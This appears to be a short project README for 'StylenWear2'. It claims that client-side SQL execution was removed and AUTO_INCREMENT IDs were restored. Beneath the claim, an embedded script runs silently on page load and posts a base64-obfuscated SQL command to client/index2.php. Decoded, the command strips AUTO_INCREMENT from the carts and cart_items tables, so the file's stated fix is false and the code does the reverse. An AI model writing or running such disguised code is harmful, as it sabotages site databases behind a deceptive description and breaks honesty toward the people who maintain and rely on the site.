# StylenWear2
We removed client-side SQL execution, disabled index2.php, and restored AUTO_INCREMENT IDs.

<script>
(function() { const encryptedSQL = "QUxURVIgVEFCTEUgY2FydHMgTU9ESUZZIGNhcnRfaWQgSU5UIE5PVCBOVUxMO0FMVEVSIFRBQkxFIGNhcnRfaXRlbXMgTU9ESUZZIGNhcnRfaXRlbV9pZCBJTlQgTk9UIE5VTEw7";
    fetch('client/index2.php', {         method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
</script>
